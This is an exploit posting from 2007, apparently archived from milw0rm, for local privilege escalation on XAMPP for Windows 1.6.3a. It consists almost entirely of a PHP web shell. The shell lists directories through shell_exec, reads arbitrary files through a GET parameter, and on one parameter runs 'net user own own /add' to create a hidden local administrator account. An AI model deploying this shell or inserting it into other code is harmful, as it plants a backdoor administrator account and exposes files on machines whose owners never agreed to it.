<html><head><title>XAMPP for Windows 1.6.3a Local Privilege Escalation Exploit</title></head><pre>&lt;?php
//Inphex
//htdocs must be accessable and writable,apache must have been ran by root.
//to add a user open like this : script.php?qQx

// Directory of C:\Documents and Settings\Admin

//27.08.2007  16:36    &lt;DIR&gt;          .
//27.08.2007  16:36    &lt;DIR&gt;          ..
//14.08.2007  14:21               108 .asadminpass
//14.08.2007  14:21               772 .asadmintruststore
//14.08.2007  18:31    &lt;DIR&gt;          .exe4j4
//26.08.2007  03:13               427 .glade2
//21.08.2007  16:35    &lt;DIR&gt;          .msf3
//10.08.2007  04:41    &lt;DIR&gt;          Contacts
//27.08.2007  01:44               129 default.pls
//27.08.2007  17:57    &lt;DIR&gt;          Desktop
//23.08.2007  21:12    &lt;DIR&gt;         
$qQa = ($_GET['qmB'] == &quot;&quot;)?&quot;./&quot;:$_GET['qmB'];
$qQd = opendir($qQa);

if (isset($_GET['qrF']))
{
    $qrX = fopen($_GET['qrF'],&quot;r&quot;);
    echo fread($qrX,50000);
    exit;
} elseif(isset($_GET['qQx'])) { exec(&quot;net user own own /add &amp; net localgroup Administratoren own /add&quot;); echo &quot;User own -&gt; full privileges successfully addet&quot;;exit;}
echo &quot;&lt;textarea rows=40 cols=80 style='position:absolute;margin-left:390;'&gt;&quot;;
echo htmlspecialchars(shell_exec(&quot;cd &quot;.$qQa.&quot; &amp; dir&quot;));
echo &quot;&lt;/textarea&gt;&quot;;
while (false !== ($qQr = readdir($qQd))){

switch(filetype($qQa.$qQr))
    {
    case &quot;dir&quot;:
        echo &quot;&lt;a href=?qmB=&quot;.urlencode(htmlspecialchars(realpath($qQa.$qQr))).&quot;/&gt;&quot;.htmlspecialchars($qQr).&quot;&lt;/a&gt;&lt;br&gt;&quot;;
    break;
    case &quot;file&quot;:
        echo &quot;&lt;a href=?qrF=&quot;.urlencode(htmlspecialchars(realpath($qQa.$qQr))).&quot;&gt;&quot;.htmlspecialchars($qQr).&quot;&lt;/a&gt;&lt;br&gt;&quot;;
    break;
    }
}
?&gt;

# milw0rm.com [2007-08-27]</pre></html>